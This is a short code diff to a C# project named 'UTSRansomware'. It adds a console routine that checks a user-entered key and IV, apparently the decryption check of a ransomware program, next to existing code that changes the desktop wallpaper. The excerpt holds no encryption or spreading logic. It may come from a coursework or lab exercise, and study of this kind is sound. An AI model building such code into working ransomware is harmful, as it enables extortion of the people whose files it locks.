@@ -55,5 +55,25 @@ namespace UTSRansomware
             // Call SystemParametersInfo function to set the desktop wallpaper
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         }
+
+        public static bool ValidateKeyAndIv(byte[] key, byte[] iv)
+        {
+            // Prompt user for key and IV
+            Console.WriteLine("Please enter the key:");
+            string userInputKey = Console.ReadLine();
+
+            Console.WriteLine("Please enter the IV:");
+            string userInputIv = Console.ReadLine();
+
+            // Convert the base64 strings to byte arrays
+            byte[] inputKeyBytes = Convert.FromBase64String(userInputKey);
+            byte[] inputIvBytes = Convert.FromBase64String(userInputIv);
+
+            // Check if they match the current key and iv
+            bool keyMatches = key.SequenceEqual(inputKeyBytes);
+            bool ivMatches = iv.SequenceEqual(inputIvBytes);
+
+            return keyMatches && ivMatches;
+        }
     }
 }
